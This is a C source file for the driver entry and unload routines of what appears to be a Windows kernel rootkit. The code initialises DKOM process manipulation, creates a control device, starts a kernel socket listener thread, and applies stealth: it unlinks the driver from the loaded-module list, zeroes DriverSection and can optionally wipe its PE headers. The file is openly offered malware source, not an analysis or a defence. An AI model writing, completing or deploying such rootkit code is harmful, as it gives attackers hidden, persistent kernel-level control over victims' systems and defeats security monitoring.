/*==============================================================================
 * rootkit/src/driver.c
 *------------------------------------------------------------------------------
 * DriverEntry / DriverUnload - Main driver lifecycle.
 *============================================================================*/
#include "../utils.h"

/*==============================================================================
 * FORWARD DECLARATIONS
 *============================================================================*/
NTSTATUS device_create(PDRIVER_OBJECT drv, PDEVICE_OBJECT* out_dev);
VOID     device_destroy(PDEVICE_OBJECT dev);
VOID     device_set_dispatch(PDRIVER_OBJECT drv);
NTSTATUS socket_init(VOID);
VOID     socket_deinit(VOID);
VOID     listener_thread(PVOID ctx);
NTSTATUS stealth_init(PDRIVER_OBJECT drv);
NTSTATUS stealth_wipe_headers(VOID);
VOID     stealth_deinit(VOID);
VOID     dkom_init(VOID);

/*==============================================================================
 * GLOBAL STATE
 *============================================================================*/
static PDEVICE_OBJECT g_device = NULL;
static PETHREAD       g_listener_thread = NULL;

/*==============================================================================
 * DRIVER UNLOAD ROUTINE
 *------------------------------------------------------------------------------
 * Called when service is stopped (sc stop) or via IOCTL_ROOTKIT_UNLOAD.
 * Teardown order:
 *   1. Signal listener thread, close WSK
 *   2. Wait for listener thread termination
 *   3. Delete device + symbolic link
 *   4. Stealth teardown (relink module list if RELINK_ON_UNLOAD=1)
 *============================================================================*/
VOID driver_unload(PDRIVER_OBJECT drv) {
    RK_DBG("unload");

    /* 1. Signal listener, close WSK. */
    socket_deinit();

    /* 2. Wait for listener thread to exit. */
    if (g_listener_thread) {
        KeWaitForSingleObject(g_listener_thread, Executive, KernelMode, FALSE, NULL);
        ObDereferenceObject(g_listener_thread);
        g_listener_thread = NULL;
    }

    /* 3. Delete device + symlink. */
    device_destroy(g_device);
    g_device = NULL;

    /* 4. Stealth teardown. */
    stealth_deinit();

    RK_DBG("unloaded");
}

/*==============================================================================
 * DRIVER ENTRY POINT
 *------------------------------------------------------------------------------
 * Initialization order:
 *   1. Set DriverUnload + dispatch table
 *   2. Resolve EPROCESS offsets (required for all process ops)
 *   3. Initialize DKOM side-table
 *   4. Create device + symbolic link
 *   5. Initialize WSK + start listener thread
 *   6. Apply stealth (unlink from module list, zero DriverSection)
 *   7. Optional: Wipe PE headers (irreversible, commented out by default)
 *============================================================================*/
NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg_path) {
    UNREFERENCED_PARAMETER(reg_path);

    drv->DriverUnload = driver_unload;
    device_set_dispatch(drv);

    /*--- Step 1: Calibrate EPROCESS offsets ---*/
    NTSTATUS s = resolve_eprocess_offsets();
    if (!NT_SUCCESS(s)) {
        RK_DBG("resolve_eprocess_offsets failed 0x%08X", s);
        return s;
    }

    /*--- Step 2: Initialize DKOM ---*/
    dkom_init();

    /*--- Step 3: Create device + symlink ---*/
    s = device_create(drv, &g_device);
    if (!NT_SUCCESS(s)) return s;

    /*--- Step 4: Initialize WSK ---*/
    s = socket_init();
    if (!NT_SUCCESS(s)) {
        device_destroy(g_device);
        g_device = NULL;
        return s;
    }

    /*--- Step 5: Start listener system thread ---*/
    HANDLE th = NULL;
    s = PsCreateSystemThread(&th, THREAD_ALL_ACCESS, NULL, NULL, NULL,
                             listener_thread, NULL);
    if (!NT_SUCCESS(s)) {
        socket_deinit();
        device_destroy(g_device);
        g_device = NULL;
        return s;
    }
    ObReferenceObjectByHandle(th, THREAD_ALL_ACCESS, NULL, KernelMode,
                              (PVOID*)&g_listener_thread, NULL);
    ZwClose(th);

    /*--- Step 6: Apply stealth ---*/
    stealth_init(drv);

    /*--- Step 7: Optional PE header wipe (irreversible) ---
     * Uncomment to enable. Requires RELINK_ON_UNLOAD=0 for clean unload
     * since headers cannot be restored. */
    /* stealth_wipe_headers(); */

    return STATUS_SUCCESS;
}